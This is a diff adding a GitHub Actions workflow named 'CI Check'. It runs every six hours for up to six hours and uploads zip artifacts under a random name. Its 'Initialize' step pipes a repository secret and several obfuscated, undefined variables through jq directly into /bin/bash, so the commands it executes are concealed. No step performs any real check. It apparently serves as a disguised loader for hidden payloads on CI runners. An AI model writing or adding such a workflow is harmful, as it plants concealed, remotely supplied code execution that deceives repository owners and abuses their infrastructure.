@@ -1,0 +1,35 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          zg112: ${{ secrets.zg112 }}
+        run: |
+          printf '%s' "$zg112" | jq -r .v512 | /bin/bash
+          echo $na2063 | jq -r .aazfn142 | /bin/bash
+          printf '%s' "$rj15" | jq -r .gb3 | /bin/bash
+          echo $vjtf47 | jq -r .wtwpj6772 | /bin/bash
+          echo $btx7512 | jq -r .fvix84471 | /bin/bash
+          printf '%s' "$tliyy78648" | jq -r .d0009 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: OqmdJZSY
+          path: "*.zip"
+          retention-days: 1
